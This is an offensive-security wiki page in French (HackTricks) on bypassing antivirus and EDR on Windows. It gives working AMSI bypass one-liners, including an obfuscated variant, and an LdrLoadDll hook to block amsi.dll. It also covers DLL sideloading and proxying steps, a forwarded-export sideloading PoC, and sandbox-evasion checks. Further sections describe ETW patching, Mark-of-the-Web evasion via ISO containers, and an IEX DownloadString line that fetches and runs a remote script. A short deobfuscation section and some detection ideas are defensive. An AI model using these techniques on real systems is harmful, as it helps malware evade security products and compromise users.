# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**Cette page a été écrite par** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Arrêter Defender

- [defendnot](https://github.com/es3n1n/defendnot): Un outil pour empêcher Windows Defender de fonctionner.
- [no-defender](https://github.com/es3n1n/no-defender): Un outil pour empêcher Windows Defender de fonctionner en simulant un autre AV.
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

## **AV Evasion Methodology**

Actuellement, les AV utilisent différentes méthodes pour vérifier si un fichier est malveillant ou non : static detection, dynamic analysis, et pour les EDRs plus avancés, behavioural analysis.

### **Static detection**

La static detection se fait en signalant des chaînes connues ou des tableaux d'octets dans un binaire ou script, et en extrayant aussi des informations du fichier lui‑même (par ex. file description, company name, digital signatures, icon, checksum, etc.). Cela signifie que l'utilisation d'outils publics connus peut vous faire repérer plus facilement, car ils ont probablement été analysés et signalés comme malveillants. Il y a plusieurs façons de contourner ce type de détection :

- **Encryption**

Si vous chiffrez le binaire, il n'y aura aucun moyen pour l'AV de détecter votre programme, mais vous aurez besoin d'un loader pour déchiffrer et exécuter le programme en mémoire.

- **Obfuscation**

Parfois il suffit de changer quelques chaînes dans votre binaire ou script pour le faire passer devant l'AV, mais cela peut être chronophage selon ce que vous essayez d'obfusquer.

- **Custom tooling**

Si vous développez vos propres outils, il n'y aura pas de signatures connues, mais cela demande beaucoup de temps et d'efforts.

> [!TIP]
> A good way for checking against Windows Defender static detection is [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). It basically splits the file into multiple segments and then tasks Defender to scan each one individually, this way, it can tell you exactly what are the flagged strings or bytes in your binary.

Je vous recommande fortement de consulter cette [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) sur l'AV Evasion pratique.

### **Dynamic analysis**

La dynamic analysis consiste à exécuter votre binaire dans un sandbox et surveiller les activités malveillantes (par ex. trying to decrypt and read your browser's passwords, performing a minidump on LSASS, etc.). Cette partie peut être un peu plus délicate à gérer, mais voici quelques approches pour échapper aux sandboxes.

- **Sleep before execution** Selon l'implémentation, c'est un excellent moyen de contourner la dynamic analysis des AV. Les AV disposent d'un temps très court pour analyser les fichiers afin de ne pas interrompre le flux de l'utilisateur, donc utiliser de longs sleeps peut perturber l'analyse des binaires. Le problème est que de nombreux sandboxes des AV peuvent simplement bypass le sleep selon leur implémentation.
- **Checking machine's resources** En général les sandboxes ont très peu de ressources (par ex. < 2GB RAM), sinon ils ralentiraient la machine de l'utilisateur. Vous pouvez aussi être très créatif ici, par exemple en vérifiant la température du CPU ou même la vitesse des ventilateurs, tout n'est pas forcément implémenté dans le sandbox.
- **Machine-specific checks** Si vous voulez cibler un utilisateur dont la workstation est jointe au domaine "contoso.local", vous pouvez vérifier le domain de l'ordinateur pour voir s'il correspond, si ce n'est pas le cas, faire quitter votre programme.

Il se trouve que le nom de l'ordinateur du Sandbox de Microsoft Defender est HAL9TH, donc vous pouvez vérifier le nom de l'ordinateur dans votre malware avant la détonation ; si le nom correspond à HAL9TH, cela signifie que vous êtes dans le sandbox de Defender, et vous pouvez faire quitter votre programme.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>source : <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Quelques autres très bons conseils de [@mgeeky](https://twitter.com/mariuszbit) pour contrer les Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Comme nous l'avons déjà dit dans cet article, **les outils publics** finiront par **être détectés**, donc posez‑vous la question :

Par exemple, si vous voulez dumper LSASS, **avez‑vous vraiment besoin d'utiliser mimikatz** ? Ou pourriez‑vous utiliser un autre projet moins connu qui dump aussi LSASS.

La bonne réponse est probablement la seconde. En prenant mimikatz comme exemple, c'est probablement l'un des, sinon le plus signalé par les AVs et EDRs ; bien que le projet soit super, c'est aussi un cauchemar pour contourner les AVs, donc cherchez simplement des alternatives pour ce que vous souhaitez accomplir.

> [!TIP]
> When modifying your payloads for evasion, make sure to **turn off automatic sample submission** in defender, and please, seriously, **DO NOT UPLOAD TO VIRUSTOTAL** if your goal is achieving evasion in the long run. If you want to check if your payload gets detected by a particular AV, install it on a VM, try to turn off the automatic sample submission, and test it there until you're satisfied with the result.

## EXEs vs DLLs

Chaque fois que c'est possible, priorisez toujours l'utilisation de DLLs pour l'évasion : d'après mon expérience, les fichiers DLL sont généralement **beaucoup moins détectés** et analysés, donc c'est une astuce simple pour éviter la détection dans certains cas (si votre payload peut s'exécuter en tant que DLL bien sûr).

Comme on peut le voir sur cette image, un DLL Payload de Havoc a un taux de détection de 4/26 sur antiscan.me, tandis que le payload EXE a un taux de 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL</p></figcaption></figure>

Nous allons maintenant présenter quelques astuces que vous pouvez utiliser avec des fichiers DLL pour être beaucoup plus furtif.

## DLL Sideloading & Proxying

**DLL Sideloading** tire parti de l'ordre de recherche des DLL utilisé par le loader en positionnant l'application victime et le(s) payload(s) malveillant(s) côte à côte.

Vous pouvez rechercher des programmes susceptibles de DLL Sideloading en utilisant [Siofra](https://github.com/Cybereason/siofra) et le script powershell suivant:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
This command will output the list of programs susceptible to DLL hijacking inside "C:\Program Files\\" and the DLL files they try to load.

Je vous recommande vivement d'**explore DLL Hijackable/Sideloadable programs yourself**, cette technique est assez discrète si elle est bien exécutée, mais si vous utilisez des programmes DLL Sideloadable connus publiquement, vous risquez d'être facilement détecté.

Se contenter de placer une DLL malveillante portant le nom que le programme s'attend à charger ne fera pas fonctionner votre payload, car le programme attend certaines fonctions spécifiques dans cette DLL. Pour résoudre ce problème, nous utiliserons une autre technique appelée **DLL Proxying/Forwarding**.

**DLL Proxying** transfère les appels qu'un programme effectue depuis la DLL proxy (et malveillante) vers la DLL originale, préservant ainsi la fonctionnalité du programme tout en permettant l'exécution de votre payload.

J'utiliserai le projet [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) de [@flangvik](https://twitter.com/Flangvik/)

Voici les étapes que j'ai suivies:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
La dernière commande nous donnera 2 fichiers : un modèle de code source de DLL, et la DLL originale renommée.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Notre shellcode (encodé avec [SGN](https://github.com/EgeBalci/sgn)) et le proxy DLL ont un taux de détection de 0/26 sur [antiscan.me](https://antiscan.me) ! Je dirais que c'est un succès.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Je vous **recommande vivement** de regarder [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) à propos de DLL Sideloading et aussi [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) pour en apprendre davantage sur ce que nous avons discuté de manière plus approfondie.

### Abuser des Forwarded Exports (ForwardSideLoading)

Les modules PE Windows peuvent exporter des fonctions qui sont en réalité des "forwarders" : au lieu de pointer vers du code, l'entrée d'export contient une chaîne ASCII de la forme `TargetDll.TargetFunc`. Lorsqu'un appelant résout l'export, le Windows loader va :

- Charger `TargetDll` si ce n'est pas déjà fait
- Résoudre `TargetFunc` depuis celui-ci

Comportements clés à comprendre :
- Si `TargetDll` est un KnownDLL, il est fourni depuis l'espace de noms protégé KnownDLLs (p. ex., ntdll, kernelbase, ole32).
- Si `TargetDll` n'est pas un KnownDLL, l'ordre normal de recherche des DLL est utilisé, qui inclut le répertoire du module qui effectue la résolution du forward.

Cela permet une primitive de sideloading indirecte : trouvez un signed DLL qui exporte une fonction forwardée vers un nom de module non-KnownDLL, puis placez ce signed DLL dans le même répertoire qu'un attacker-controlled DLL nommé exactement comme le module cible forwardé. Lorsque l'export forwardé est invoqué, le loader résout le forward et charge votre DLL depuis le même répertoire, exécutant votre DllMain.

Exemple observé sur Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` n'est pas une KnownDLL, donc il est résolu via l'ordre de recherche normal.

PoC (copy-paste):
1) Copier la DLL système signée dans un dossier accessible en écriture
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Déposez un `NCRYPTPROV.dll` malveillant dans le même dossier. Un `DllMain` minimal suffit pour obtenir l'exécution de code ; vous n'avez pas besoin d'implémenter la fonction redirigée pour déclencher `DllMain`.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Déclencher le forward avec un LOLBin signé :
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Observed behavior:
- rundll32 (signé) charge le side-by-side `keyiso.dll` (signée)
- Lors de la résolution de `KeyIsoSetAuditingInterface`, le loader suit le forward vers `NCRYPTPROV.SetAuditingInterface`
- Le loader charge ensuite `NCRYPTPROV.dll` depuis `C:\test` et exécute son `DllMain`
- Si `SetAuditingInterface` n'est pas implémentée, vous obtiendrez une erreur "missing API" seulement après que `DllMain` se soit déjà exécutée

Hunting tips:
- Concentrez-vous sur les exports forwardés dont le module cible n'est pas un KnownDLL. Les KnownDLLs sont listés sous `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Vous pouvez énumérer les exports forwardés avec des outils tels que:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Consultez l'inventaire des forwarders de Windows 11 pour rechercher des candidats : https://hexacorn.com/d/apis_fwd.txt

Detection/defense ideas:
- Surveillez les LOLBins (par ex., rundll32.exe) chargeant des DLL signées depuis des chemins non-système, suivies du chargement de non-KnownDLLs portant le même nom de base depuis ce répertoire
- Alertez sur des chaînes processus/module comme : `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll` sous des chemins modifiables par l'utilisateur
- Appliquez des politiques d'intégrité du code (WDAC/AppLocker) et refusez write+execute dans les répertoires d'application

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Vous pouvez utiliser Freeze pour charger et exécuter votre shellcode de manière furtive.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> L'évasion n'est qu'un jeu de chat et souris : ce qui fonctionne aujourd'hui peut être détecté demain, donc ne vous fiez jamais à un seul outil ; si possible, essayez d'enchaîner plusieurs techniques d'évasion.

## AMSI (Anti-Malware Scan Interface)

AMSI a été créé pour prévenir "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". À l'origine, les AV ne pouvaient scanner que les **fichiers sur disque**, donc si vous pouviez exécuter des payloads **directement en mémoire**, l'AV ne pouvait rien faire pour l'empêcher, n'ayant pas suffisamment de visibilité.

La fonctionnalité AMSI est intégrée dans ces composants de Windows.

- User Account Control, or UAC (élévation d'EXE, COM, MSI, ou installation ActiveX)
- PowerShell (scripts, utilisation interactive, et évaluation dynamique de code)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

Cela permet aux solutions antivirus d'inspecter le comportement des scripts en exposant le contenu des scripts sous une forme non chiffrée et non obfusquée.

Exécuter `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` produira l'alerte suivante sur Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Remarquez comment il préfixe `amsi:` puis le chemin vers l'exécutable depuis lequel le script a été lancé, dans ce cas, powershell.exe

Nous n'avons déposé aucun fichier sur le disque, mais avons quand même été détectés en mémoire à cause d'AMSI.

De plus, à partir de **.NET 4.8**, le code C# est également exécuté via AMSI. Cela affecte même `Assembly.Load(byte[])` pour le chargement en mémoire. C'est pourquoi l'utilisation de versions plus anciennes de .NET (comme 4.7.2 ou inférieures) est recommandée pour l'exécution en mémoire si vous souhaitez échapper à AMSI.

Il existe plusieurs façons de contourner AMSI :

- **Obfuscation**

Étant donné qu'AMSI fonctionne principalement avec des détections statiques, modifier les scripts que vous essayez de charger peut être un bon moyen d'éviter la détection.

Cependant, AMSI a la capacité d'unobfuscating les scripts même s'ils ont plusieurs couches, donc l'obfuscation peut être une mauvaise option selon la manière dont elle est effectuée. Cela rend l'évasion moins évidente. Toutefois, parfois, il suffit de changer quelques noms de variables pour passer, donc cela dépend du niveau auquel quelque chose a été signalé.

- **AMSI Bypass**

Puisqu'AMSI est implémenté en chargeant une DLL dans le processus powershell (ainsi que cscript.exe, wscript.exe, etc.), il est possible de la manipuler facilement même en exécutant en tant qu'utilisateur non privilégié. En raison de cette faille dans l'implémentation d'AMSI, des chercheurs ont trouvé plusieurs moyens d'éviter le scan AMSI.

**Forcer une erreur**

Forcer l'initialisation d'AMSI à échouer (amsiInitFailed) fera en sorte qu'aucun scan ne sera initié pour le processus courant. À l'origine, cela a été divulgué par [Matt Graeber](https://twitter.com/mattifestation) et Microsoft a développé une signature pour empêcher une utilisation plus large.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Il a suffi d'une seule ligne de code powershell pour rendre AMSI inutilisable pour le processus powershell en cours. Cette ligne a bien sûr été signalée par AMSI lui‑même, donc une modification est nécessaire pour utiliser cette technique.

Voici un AMSI bypass modifié que j'ai pris de ce [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Gardez à l'esprit que cela sera probablement signalé une fois ce post publié, donc vous ne devez pas publier de code si votre objectif est de rester indétecté.

**Memory Patching**

This technique was initially discovered by [@RastaMouse](https://twitter.com/_RastaMouse/) and it involves finding address for the "AmsiScanBuffer" function in amsi.dll (responsible for scanning the user-supplied input) and overwriting it with instructions to return the code for E_INVALIDARG, this way, the result of the actual scan will return 0, which is interpreted as a clean result.

> [!TIP]
> Veuillez lire [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) pour une explication plus détaillée.

Il existe également de nombreuses autres techniques pour contourner AMSI avec powershell ; consultez [**cette page**](basic-powershell-for-pentesters/index.html#amsi-bypass) et [**ce repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) pour en savoir plus.

### Bloquer AMSI en empêchant le chargement de amsi.dll (LdrLoadDll hook)

AMSI n'est initialisé qu'après le chargement de `amsi.dll` dans le processus courant. Un contournement robuste et agnostique au langage consiste à placer un hook en mode utilisateur sur `ntdll!LdrLoadDll` qui renvoie une erreur lorsque le module demandé est `amsi.dll`. En conséquence, AMSI ne se charge jamais et aucune analyse n'est effectuée pour ce processus.

Plan d'implémentation (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Remarques
- Fonctionne sur PowerShell, WScript/CScript et les loaders personnalisés (tout ce qui chargerait autrement AMSI).
- À utiliser avec l'envoi de scripts via stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) pour éviter les artefacts de ligne de commande longs.
- Observé utilisé par des loaders exécutés via LOLBins (par ex., `regsvr32` appelant `DllRegisterServer`).

This tools [https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail) also generates script to bypass AMSI.

**Supprimer la signature détectée**

Vous pouvez utiliser un outil comme **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** et **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** pour supprimer la signature AMSI détectée de la mémoire du processus courant. Cet outil fonctionne en scannant la mémoire du processus courant à la recherche de la signature AMSI, puis en l'écrasant avec des instructions NOP, la supprimant ainsi efficacement de la mémoire.

**Produits AV/EDR qui utilisent AMSI**

Vous pouvez trouver une liste de produits AV/EDR qui utilisent AMSI dans **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Utiliser PowerShell version 2**
Si vous utilisez PowerShell version 2, AMSI ne sera pas chargé, vous pouvez donc exécuter vos scripts sans qu'ils soient scannés par AMSI. Vous pouvez faire cela :
```bash
powershell.exe -version 2
```
## Journalisation PowerShell

PowerShell logging est une fonctionnalité qui permet d'enregistrer toutes les commandes PowerShell exécutées sur un système. Cela peut être utile pour l'audit et le dépannage, mais cela peut aussi être un **problème pour les attaquants qui veulent échapper à la détection**.

Pour contourner la journalisation PowerShell, vous pouvez utiliser les techniques suivantes :

- **Désactiver la transcription PowerShell et le Module Logging** : vous pouvez utiliser un outil tel que [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) à cet effet.
- **Utiliser PowerShell version 2** : si vous utilisez PowerShell version 2, AMSI ne sera pas chargé, vous pouvez donc exécuter vos scripts sans être scannés par AMSI. Vous pouvez faire ceci : `powershell.exe -version 2`
- **Utiliser une session PowerShell non gérée** : utilisez [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) pour lancer un powershell sans défenses (c'est ce que `powerpick` de Cobal Strike utilise).


## Obfuscation

> [!TIP]
> Plusieurs techniques d'obfuscation reposent sur le chiffrement des données, ce qui augmente l'entropie du binaire et facilite la détection par les AVs et les EDRs. Faites attention à cela et appliquez éventuellement le chiffrement uniquement aux sections spécifiques de votre code qui sont sensibles ou doivent être cachées.

### Déobfuscation des binaires .NET protégés par ConfuserEx

Lors de l'analyse de malware utilisant ConfuserEx 2 (ou des forks commerciaux), il est courant de se heurter à plusieurs couches de protection qui bloquent les décompilateurs et les sandboxes. Le flux de travail ci-dessous restaure de manière fiable un IL presque original qui peut ensuite être décompilé en C# dans des outils tels que dnSpy ou ILSpy.

1.  Suppression de l'anti-tampering – ConfuserEx chiffre chaque *method body* et le déchiffre dans le constructeur statique du *module* (`<Module>.cctor`). Il modifie aussi le checksum PE, donc toute modification fera planter le binaire. Utilisez **AntiTamperKiller** pour localiser les tables de métadonnées chiffrées, récupérer les clés XOR et réécrire un assembly propre :
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
La sortie contient les 6 paramètres anti-tamper (`key0-key3`, `nameHash`, `internKey`) qui peuvent être utiles pour construire votre propre unpacker.

2.  Récupération des symboles / du contrôle de flux – fournissez le fichier *clean* à **de4dot-cex** (un fork de de4dot adapté à ConfuserEx).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Options :
• `-p crx` – sélectionner le profil ConfuserEx 2  
• de4dot annulera le control-flow flattening, restaurera les namespaces, classes et noms de variables originaux et déchiffrera les chaînes constantes.

3.  Suppression des appels proxy – ConfuserEx remplace les appels directs de méthodes par des wrappers légers (a.k.a *proxy calls*) pour rendre la décompilation plus difficile. Supprimez-les avec **ProxyCall-Remover** :
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Après cette étape vous devriez voir des API .NET normales telles que `Convert.FromBase64String` ou `AES.Create()` au lieu de fonctions wrapper opaques (`Class8.smethod_10`, …).

4.  Nettoyage manuel – exécutez le binaire résultant dans dnSpy, recherchez de gros blobs Base64 ou l'utilisation de `RijndaelManaged`/`TripleDESCryptoServiceProvider` pour localiser le *vrai* payload. Souvent le malware le stocke comme un tableau d'octets encodé TLV initialisé à l'intérieur de `<Module>.byte_0`.

La chaîne ci-dessus restaure le flux d'exécution **sans** avoir besoin d'exécuter l'échantillon malveillant – utile lorsque vous travaillez sur une station hors ligne.

> 🛈  ConfuserEx produit un attribut personnalisé nommé `ConfusedByAttribute` qui peut être utilisé comme IOC pour trier automatiquement les échantillons.

#### Commande en une ligne
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: obfuscateur C#**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): L'objectif de ce projet est de fournir un fork open-source de la suite de compilation [LLVM](http://www.llvm.org/) capable d'améliorer la sécurité logicielle via la [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) et le tamper-proofing.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator démontre comment utiliser le langage `C++11/14` pour générer, au moment de la compilation, du code obfusqué sans utiliser d'outil externe et sans modifier le compilateur.
- [**obfy**](https://github.com/fritzone/obfy): Ajoute une couche d'opérations obfusquées générées par le framework de template metaprogramming C++ qui compliquera un peu la tâche de la personne voulant cracker l'application.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz est un obfuscateur binaire x64 capable d'obfusquer différents fichiers pe, incluant : .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame est un simple moteur de code métamorphique pour exécutables arbitraires.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator est un framework d'obfuscation de code finement granulaire pour les langages supportés par LLVM utilisant ROP (return-oriented programming). ROPfuscator obfusque un programme au niveau du code assembleur en transformant les instructions normales en chaînes ROP, contrecarrant notre conception naturelle du flux de contrôle normal.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt est un .NET PE Crypter écrit en Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor est capable de convertir des EXE/DLL existants en shellcode puis de les charger

## SmartScreen & MoTW

Vous avez peut-être vu cet écran en téléchargeant certains exécutables depuis Internet et en les exécutant.

Microsoft Defender SmartScreen est un mécanisme de sécurité destiné à protéger l'utilisateur final contre l'exécution d'applications potentiellement malveillantes.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen fonctionne principalement avec une approche basée sur la réputation, ce qui signifie que les applications peu téléchargées déclencheront SmartScreen, alertant et empêchant l'utilisateur final d'exécuter le fichier (bien que le fichier puisse toujours être exécuté en cliquant sur More Info -> Run anyway).

**MoTW** (Mark of The Web) est un [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) du nom Zone.Identifier qui est automatiquement créé lors du téléchargement de fichiers depuis Internet, avec l'URL d'où il a été téléchargé.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Vérification de l'ADS Zone.Identifier pour un fichier téléchargé depuis Internet.</p></figcaption></figure>

> [!TIP]
> Il est important de noter que les exécutables signés avec un certificat de signature **trusted** **ne déclencheront pas SmartScreen**.

Une façon très efficace d'empêcher que vos payloads reçoivent le Mark of The Web est de les emballer à l'intérieur d'une sorte de conteneur comme une ISO. Cela se produit parce que Mark-of-the-Web (MOTW) **ne peut pas** être appliqué aux volumes **non NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) est un outil qui emballe des payloads dans des conteneurs de sortie pour éviter le Mark-of-the-Web.

Example usage:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) est un mécanisme puissant de journalisation sous Windows qui permet aux applications et aux composants système de **consigner des événements**. Cependant, il peut aussi être utilisé par les produits de sécurité pour surveiller et détecter des activités malveillantes.

De la même manière qu'AMSI est désactivé (contourné), il est aussi possible de faire en sorte que la fonction **`EtwEventWrite`** du processus en espace utilisateur retourne immédiatement sans consigner d'événements. Cela se fait en patchant la fonction en mémoire pour qu'elle retourne immédiatement, désactivant ainsi la journalisation ETW pour ce processus.

Vous pouvez trouver plus d'infos dans **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Charger des binaires C# en mémoire est connu depuis longtemps et reste une excellente façon d'exécuter vos outils post-exploitation sans être détecté par l'AV.

Puisque le payload sera chargé directement en mémoire sans toucher le disque, nous n'aurons qu'à nous préoccuper de patcher AMSI pour l'ensemble du processus.

La plupart des frameworks C2 (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) offrent déjà la capacité d'exécuter des assemblies C# directement en mémoire, mais il existe différentes façons de procéder :

- **Fork\&Run**

Cela implique de **lancer un nouveau processus sacrificiel**, d'injecter votre code malveillant post-exploitation dans ce nouveau processus, d'exécuter votre code malveillant et, une fois terminé, de tuer le nouveau processus. Cela a des avantages et des inconvénients. L'avantage de la méthode fork and run est que l'exécution se fait **en dehors** de notre processus Beacon implanté. Cela signifie que si quelque chose tourne mal ou est détecté lors de notre action post-exploitation, il y a une **bien plus grande chance** que notre **implant survive.** L'inconvénient est que vous avez une **chance plus élevée** d'être détecté par des **détections comportementales**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Il s'agit d'injecter le code malveillant post-exploitation **dans son propre processus**. De cette façon, vous évitez de créer un nouveau processus qui serait scanné par l'AV, mais l'inconvénient est que si quelque chose se passe mal lors de l'exécution de votre payload, il y a une **beaucoup plus grande chance** de **perdre votre beacon** car il pourrait planter.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
